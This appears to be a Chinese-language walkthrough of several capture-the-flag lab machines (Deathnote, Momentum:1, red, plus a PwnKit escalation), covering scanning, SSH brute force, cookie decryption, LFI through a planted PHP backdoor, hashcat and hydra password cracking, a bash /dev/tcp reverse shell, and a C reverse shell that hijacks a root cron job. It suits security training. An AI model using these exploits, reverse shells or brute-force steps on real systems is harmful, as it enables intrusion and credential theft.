 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 4   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
 6   exploit/linux/local/glibc_realpath_priv_esc                         Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/ntfs3g_priv_esc                                 Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 9   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 10  exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 11  exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
...
```



逐个尝试扫描到的漏洞，成功提升权限到 root

```
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1 
SESSION => 1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 5555
LPORT => 5555

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run 
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.qhwyrca
[+] The target is vulnerable.
[*] Writing '/tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.wefuymefljbi
[*] Sending stage (3045380 bytes) to 127.0.0.1
[+] Deleted /tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so
[+] Deleted /tmp/.wefuymefljbi/.oniqfxz
[+] Deleted /tmp/.wefuymefljbi
[*] Meterpreter session 2 opened (127.0.0.1:5555 -> 127.0.0.1:54186) at 2025-03-04 10:22:28 +0000

meterpreter > shell
Process 4624 created.
Channel 1 created.
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```



### Deathnote

Nmap 扫描 IP

```
nmap -sP -PR -n -T 5 10.10.10.0/24

address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.101  00:0c:29:77:aa:a8        Linux               4.X    server
```



Nmap 扫描 TCP 服务

```
db_nmap -sS -sV -n -p- -r -O -T 5 10.10.10.101

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.101  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.101  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



FFUF 工具使用高频文件字典进行扫描，发现 robots.txt 文件

```
ffuf -u http://10.10.10.101/FUZZ -w raft-large-files-lowercase.txt

robots.txt              [Status: 200, Size: 68, Words: 11, Lines: 5, Duration: 1ms]
```



访问 robots.txt 页面，提示 /important.jpg 路径

```
curl http://10.10.10.101/robots.txt
fuck it my dad 
added hint on /important.jpg

ryuk please delete it
```



访问 important.jpg 页面，其是一个 ASCII 文本文件

```
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself 
but i think it is in the hint section of site
```

提示用户名存放在 **user.txt** 中



FFUF 工具使用目录字典进行扫描

```
ffuf -u http://10.10.10.101/FUZZ -w raft-medium-directories-lowercase.txt

wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
```



访问 manual 页面，这是 apache 的文档，无内容。

访问 wordpress 页面，发现该网站是 wordpress CMS，后端是 apache + php。

注：这里将 10.10.10.101 和域名 deathnote.vuln 绑定，通过域名访问网站，否则会出现问题。

![image-20250305095616725](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305095616725.png)



查看网页元素发现 upload 路径

![image-20250305094305755](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305094305755.png)



尝试在靶机上访问该路径，发现该路径存在，开启了 apache 的目录浏览模式，存在 user.txt 和 notes.txt

![image-20250305095811866](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305095811866.png)



根据 user.txt 和 notes.txt 猜测可能是账号和密码表。

```
user.txt

KIRA
L
ryuk
...
```

```
notes.txt

death4
death4life
death4u
...
```



尝试进行 ssh 登录

```
msf6 > use auxiliary/scanner/ssh/ssh_login 

msf6 auxiliary(scanner/ssh/ssh_login) > hosts -R 
RHOSTS => 10.10.10.101

msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE user.txt 
USER_FILE => user.txt

msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE notes.txt
PASS_FILE => notes.txt

msf6 auxiliary(scanner/ssh/ssh_login) > run 
[*] 10.10.10.101:22 - Starting bruteforce

[+] 10.10.10.101:22 - Success: 'l:death4me' 'uid=1000(l) gid=1000(l) groups=1000(l),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth) Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux '
[*] SSH session 1 opened (10.10.10.10:36185 -> 10.10.10.101:22) at 2025-03-05 02:12:59 +0000
uname -a 
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux
```



查找主机上的文件，/home/l/user.txt 文件内容为 Brainfuck 编码

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

```
i think u got the shell , but you wont be able to kill me -kira
```



文件 /opt/L/fake-notebook-rule/case.wav 内容为 16 进制

```
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```



文件 /opt/L/fake-notebook-rule/hint 提示使用 cyberchef 进行解码

```
use cyberchef
```



使用 cyberchef 的魔法功能进行编码识别，密码为 **kiraisevil**

![image-20250305125832566](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305125832566.png)

![image-20250305125843254](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305125843254-1741150724551-5.png)



切换到 kira 用户，登录成功

```
l@deathnote:/etc/apache2$ su kira
Password: 
kira@deathnote:/etc/apache2$ 
```



查看 kira 用户的 sudo 权限，可以执行任何命令

```
kira@deathnote:/etc/apache2$ sudo -l 
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```



修改 root 用户密码

```
kira@deathnote:/etc/apache2$ sudo passwd root
New password: 
Retype new password: 
passwd: password updated successfully
```



切换到 root 用户

```
kira@deathnote:/etc/apache2$ su root
Password: 
root@deathnote:/etc/apache2# 
```



### Momentum：1

Nmap 扫描端口

```
db_nmap -sS -sV -p- -r -n -O -T 5 10.10.10.102
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.102  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.102  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



通过浏览器访问网站，使用 Wappalyzer 识别网站使用了 PHP 语言。

在浏览器中进行简单交互，发现其涉及到数据库查询，但是此处无 SQL 注入。

![image-20250306154124850](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306154124850.png)





使用 FFUF 工具爆破网站 URL

```
ffuf -u http://10.10.10.102/FUZZ -w raft-large-directories-lowercase.txt
```

```
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 247ms]
img                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 986ms]
:: Progress: [56162/56162] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```



经过手工检查 manual、css 和 img 路径正常，js 路径下存在 main.js 文件。

```
curl http://10.10.10.102/js/main.js
```

```
function viewDetails(str) {

  window.location.href = "opus-details.php?id="+str;
}

/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
```



该代码属于典型的AES-CBC模式解密实现，适用于解密通过CryptoJS默认配置加密的数据，这里设置了密码为`SecretPassphraseMomentum` 。

在测试过程中发现网站下发了一个 cookie，尝试使用改密码进行解密，解密后的结果为：`auxerre-alienum##` 。

![image-20250306155006262](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306155006262.png)

![image-20250306155028985](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306155028985.png)

解密网站：https://stackblitz.com/edit/cryptojs-aes-encrypt-decrypt?file=index.js



使用 node 进行解密

```
npm install crypto-js

added 1 package in 2s
```

```
node 

Welcome to Node.js v20.14.0.
Type ".help" for more information.
> var CryptoJS = require("crypto-js");
undefined

> encrypted = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt"
'U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt'

> var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
undefined

> console.log(decrypted.toString(CryptoJS.enc.Utf8));
auxerre-alienum##
undefined
```



尝试使用线索 **auxerre-alienum##** 通过 ssh 进行登录，测试发现用户名为 **auxerre** ，密码为**原始字符串（auxerre-alienum##）**。

查看进程发现以 root 用户运行 redis 进程。

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
redis      519  0.1  0.5  57304 12020 ?        Ssl  02:40   0:31 /usr/bin/redis-server 127.0.0.1:6379
```



经过进一步研究，可以连接到它并查看其内容，经测试，该密码为 root 密码。

![image-20250306160617837](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306160617837.png)



### red

该靶机已经被攻击者入侵，并留下了后门，需要找出攻击者留下的后门，并利用该漏洞一步一步获取 root 权限。



端口发现

```
db_nmap -sS -sV -p- -r -n -T 5 -O 10.10.10.103
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.103  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.10.103  80    tcp    http  open   Apache httpd 2.4.41 (Ubuntu)
```



apache 端口 80 意味着有一个网页，所以转到浏览器并输入目标 ip 地址来访问该网页。

![img](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/1Ahon-fRZUiZIAn7pintPiA.png)



检查网站后，确定这是一个 WordPress 网站，但无法正常加载。为了解决这个问题，需要将域名和主机的映射添加到 hosts 文件中。

```
10.10.10.103    redrocks.win
```



现在我们可以看到 Red 向我们发出的警告信息，指出我们的网站已被黑客入侵。Red 还为我们提供了有关后门的线索。

![img](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/121y4gXlIs5d1-L_H4V8v5w.png)



使用 FFUF 对一些路径进行暴力破解

```
ffuf -u http://redrocks.win/FUZZ -w CommonBackdoors-PHP.fuzz.txt
```

```
NetworkFileManagerPHP.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 2770ms]
```



直接访问这个路径，并没有返回任何内容

```
curl -i http://redrocks.win/NetworkFileManagerPHP.php 

HTTP/1.0 500 Internal Server Error
Date: Sat, 08 Mar 2025 15:06:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```



它是一个 webshell后门。但根据我们的提示，我们知道 Red 正在将其用作某种类型的 LFI 后门。

LFI（Local File Inclusion，本地文件包含）后门是一种利用Web应用程序中的文件包含漏洞（LFI）来植入或维持持久性访问权限的恶意技术。

LFI 后门，可通过URL参数（如`?page=about.php`）操控文件包含路径。尝试使用 LFI 参数字典尝试爆破这个后门的参数。

```
ffuf -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test -w lfi-fuzz-params-list.txt -mc 200
```

```
key                     [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 4888ms]
```



LFI 后门的参数是 key，使用漏洞读取文件，发现可登录的用户为 root、john、ippsec 和 oxdf 等。

```
curl http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd | grep /bin/bash
```

```
root:x:0:0:root:/root:/bin/bash	
john:x:1000:1000:john:/home/john:/bin/bash
ippsec:x:1001:1001:,,,:/home/ippsec:/bin/bash
oxdf:x:1002:1002:,,,:/home/oxdf:/bin/bash
```



读取 wp-config.php 文件，获取数据库的账号和密码。

```
curl -i http://redrocks.win/NetworkFileManagerPHP.php?key=wp-config.php 

HTTP/1.1 200 OK
Date: Sat, 08 Mar 2025 15:38:44 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 1
Content-Type: text/html; charset=UTF-8
```

服务器返回 HTTP 200 Code，但是没有任何内容，因为 wp-config.php 文件内容为 `<?php ... ?>` ，PHP 会尝试解析和执行这些代码，而不是直接以文本形式返回。



此处可以使用 php 伪协议，在读取文件内容时进行 base64 编码，此时 PHP 就无法解析和执行代码，而是直接返回文本。

```
curl -i http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php
HTTP/1.1 200 OK
Date: Sat, 08 Mar 2025 15:42:22 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 4529
Content-Type: text/html; charset=UTF-8

PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb...
```



在使用 curl 不使用 -i 参数，并将错误输出重定向到  /dev/null，将返回的内容通过管道传输给 base64 进行解码

```
curl http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php 2> /dev/null | base64 -d
```

```
<? ...

/** MySQL database username */
define( 'DB_USER', 'john' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );

... ?>
```

- 用户：**john**
- 密码：**R3v_m4lwh3r3_k1nG!!**



数据库用户名和系统用户名相同，尝试使用该用户名和密码通过 SSH 登录系统，登录失败。

读取LFI 后门文件 NetworkFileManagerPHP.php 文件获取更多信息。

```
curl  http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php 2> /dev/null | base64 -d
```

```
<?php
   $file = $_GET['key'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("NetworkFileManagerPHP.php");
   }
   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
?>
```



LFI 后门文件中有一段经过 base64 编码的注释，解码后的内容如下：

```
That password alone won't help you! Hashcat says rules are rules
```

**That password alone won't help you!**” 指仅凭一个原始密码（如从泄露数据中获取的明文密码）不足以破解目标系统，密码可能经过变形。

“**Hashcat says rules are rules**” 强调必须使用 Hashcat 的规则集来扩展密码的可能性，否则无法成功破解。这里的第一个“rules”指技术规则（密码变形规则），第二个“rules”借用英文谚语“规则就是规则”，暗示必须遵守客观规律。



创建一个文件，命名为 pass.txt，文件内容如下。

```
R3v_m4lwh3r3_k1nG!!
```

使用 hashcat 中的 best64.rule 规则对密码进行变形。

```
hashcat --force pass.txt -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
```

```
R3v_m4lwh3r3_k1nG!!
!!Gn1k_3r3hwl4m_v3R
R3V_M4LWH3R3_K1NG!!
r3v_m4lwh3r3_k1nG!!
R3v_m4lwh3r3_k1nG!!0
...
```



通过 Hydra 使用变形的 wordlist.txt 密码字典，对 john 用户的密码进行爆破。

```
hydra -l john -P wordlist.txt 10.10.10.103 ssh
```

```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.10.103:22/
[22][ssh] host: 10.10.10.103   login: john   password: r3v_m4lwh3r3_k1nG!!
1 of 1 target successfully completed, 1 valid password found
```



现在可以通过 SSH 进入服务器，red 设置了防御机制，5 分钟后将我们注销并更改密码。

```
Last login: Sat Mar  8 16:51:07 2025 from 10.10.10.10
john@red:~$ Red Rules, Blue Drools!
You will never win Blue
Say Bye Bye to your Shell Blue and that password
Connection to 10.10.10.103 closed by remote host.
Connection to 10.10.10.103 closed.
```



可以看到我们有一个名为 ippsec 的用户，也可以不使用密码成功登录。

```
sudo -l

Matching Defaults entries for john on red:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on red:
    (ippsec) NOPASSWD: /usr/bin/time
```



因此，要以 ippsec 身份登录，我们使用以下命令

```
sudo -u ippsec /usr/bin/time /bin/bash
```



现在首先我们需要迅速采取行动并禁用 cronjob 系统以避免被注销。

现在我们需要在攻击机创建一个 netcat 监听器，这样我们就可以获取该机器的 revshell。

```
rlwrap nc -lnvp 3333
```



在靶机执行以下命令，反弹 shell。

```
bash -i >& /dev/tcp/10.10.10.10/3333 0>&1
```



一旦我们获得了机器的 revshell，我们就需要使用这个 python 命令。这是一个用于生成新 shell 进程并将其附加到类 Unix 系统上的伪终端 (pty) 的命令。

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```



现在我们通过使用以下方式将 netcat 会话置于后台

```
[CTRL + Z]
```



接下来我们输入这个命令并按两次 Enter 键，该命令将终端设置为“原始”模式并关闭“回显”模式。

```
stty raw -echo;fg 
```



设置终端类型，现在这个过程已经完成，一旦我们被踢出，我们仍然可以访问 shell。

```
export TERM=xterm
```



为了获得更好的交互体验，这里我是用 rospo 工具在 2222 端口启动一个 ssh 服务，并使用 ssh 客户端连接上去。

将 rospo 工具传输到靶机，攻击机执行以下命令：

```
nc -lnvp 4444 < rospo 
Listening on 0.0.0.0 4444
...
```

靶机执行以下命令：

```
nc 10.10.10.10 4444 > rospo
```



检查文件是否传输正确，并赋予执行权限

```
rospo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=wY5thRmEU730-d9-WMID/meQnPmO4P_odf73Yhr5U/307mrOZn7rGvdWn-fpC5/-HjFX7R-q9_Xf9BJZbGq, stripped
```

```
sha512sum rospo
4112a5f2750fa9e4236491b588c22b6321f98d21603ba71b688e193c169eb43bae1192f620b36a764cf1ab193818f6a487eb5f23a34b9c911f5e6f0d3fb2dbde  rospo
```

```
chmod +x rospo
```



启动服务

```
nohup ./rospo sshd -A 111 -P :2222 > out 2>&1 &
```

```
ssh ippsc@10.10.10.103 -p 2222

 .---------------.
 | 🐸 rospo sshd |
 .---------------.

ippsc@10.10.10.103's password: 
ippsec@red:~$ 
```



现在让我们导航到 wordpress 文件夹

```
cd /var/www/wordpress
```



现在我们可以看到一个由 root 和 ippsec 拥有的 .git 文件夹。我们需要进入这个文件夹

![image-20250308171924321](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250308171924321.png)



在 .git 文件夹中，可以看到一个名为supersecretfileuc.c的文件，现在让我们使用tac查看这个文件的内容：

```
tac supersecretfileuc.c | tac
```

```
#include <stdio.h>
  
int main()
{
  
    // prints hello world
    printf("Get out of here Blue!\n");
  
    return 0;
}
```



现在我们可以看到 C 脚本是一个 cronjob，如果我们尝试执行 rev 脚本，我们可以看到它加载了 cronjob 消息。

![image-20250308172103795](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250308172103795.png)



这意味着 red 可能会以 root 用户执行 rev 文件，我们可以将 rev 替换为我们进行构造的文件（一个反向 shell），这样可以获取到 root 权限。如果删除 rev 文件，在 root 每次执行 rev 文件前，会重新将 supersecretfileuc.c 文件的内容重新编译为 rev，所以只需要替换 supersecretfileuc.c 文件的内容即可。以下是反向 shell 的 C 代码。

```
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
   int port=5555;
   struct sockaddr_in revsockaddr;
   
   int sockt = socket(AF_INET, SOCK_STREAM, 0);
   revsockaddr.sin_family = AF_INET;
   revsockaddr.sin_port = htons(port);
   revsockaddr.sin_addr.s_addr = inet_addr("10.10.10.10");
   
   
  connect(sockt, (struct sockaddr *) &revsockaddr,
  sizeof(revsockaddr));
  dup2(sockt, 0);
  dup2(sockt, 1);
  dup2(sockt, 2);
  
  char * const argv[] = {"/bin/bash", NULL};
  execve("/bin/bash", argv, NULL);
  
  return 0;
  
}
```



编码成 base64 后直接使用 echo 命令输出，通过管道传输给 base64 命令进行解码，然后重定向到 supersecretfileuc.c  文件中。

![image-20250308172512303](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250308172512303.png)



由于这两个文件的所有权为 root，所以不能直接修改。由于我们拥有父目录的写入全新啊，所以可以删除文件后在创建。

```
-rwxr-xr-x 1 root     root     16712 Mar  8 17:24 rev
-rw-r--r-- 1 root     root       123 Oct 31  2021 supersecretfileuc.c
```

```
echo I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCg0KaW50IG1haW4odm9pZCl7DQogICBpbnQgcG9ydD01NTU1Ow0KICAgc3RydWN0IHNvY2thZGRyX2luIHJldnNvY2thZGRyOw0KICAgDQogICBpbnQgc29ja3QgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIDApOw0KICAgcmV2c29ja2FkZHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICByZXZzb2NrYWRkci5zaW5fcG9ydCA9IGh0b25zKHBvcnQpOw0KICAgcmV2c29ja2FkZHIuc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKCIxMC4xMC4xMC4xMCIpOw0KICAgDQogICANCiAgY29ubmVjdChzb2NrdCwgKHN0cnVjdCBzb2NrYWRkciAqKSAmcmV2c29ja2FkZHIsDQogIHNpemVvZihyZXZzb2NrYWRkcikpOw0KICBkdXAyKHNvY2t0LCAwKTsNCiAgZHVwMihzb2NrdCwgMSk7DQogIGR1cDIoc29ja3QsIDIpOw0KICANCiAgY2hhciAqIGNvbnN0IGFyZ3ZbXSA9IHsiL2Jpbi9iYXNoIiwgTlVMTH07DQogIGV4ZWN2ZSgiL2Jpbi9iYXNoIiwgYXJndiwgTlVMTCk7DQogIA0KICByZXR1cm4gMDsNCiAgDQp9 | base64 -d | tac | tac > supersecretfileuc.c
```



在攻击机上通过监听 5555 端口，等待大约 2 分钟后，接收到反弹 shell，获取到 root 权限。

```
nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.10.10.103 36318

id
uid=0(root) gid=0(root) groups=0(root)
```

